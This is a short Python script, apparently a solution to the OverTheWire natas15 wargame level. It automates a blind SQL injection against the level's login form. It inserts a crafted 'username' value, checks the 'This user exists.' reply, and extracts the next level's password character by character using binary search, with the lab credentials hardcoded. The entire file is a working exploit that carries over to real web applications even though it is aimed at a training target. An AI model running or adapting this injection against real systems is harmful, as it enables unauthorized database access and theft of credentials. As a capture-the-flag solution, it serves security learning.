import requests

char = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
url = 'http://natas15.natas.labs.overthewire.org/index.php'
password = ""
temp = ""

def request( index, op, c ):
	username = 'natas16" and char(ascii(substring(password,' + str(index) + ',1)))' + op + '"' + c;
	res = requests.post( url, {'username':username}, auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J') )
	return "This user exists." in res.content

def binary_search( first, last, index ):
    if first > last:
        return ''
    
    middle = ( first + last )/2
    
    if request( index, '=', char[ middle ] ):
        return char[ middle ]
    elif request( index, '>', char[ middle ] ):
        return binary_search( middle+1, last, index )
    else:
        return binary_search( first, middle-1, index )

for i in range( 1, 50 ):
    password += binary_search( 0, len(char)-1, i )
    if temp == password:
        print "password: " + password
        break
    print password
    temp = password;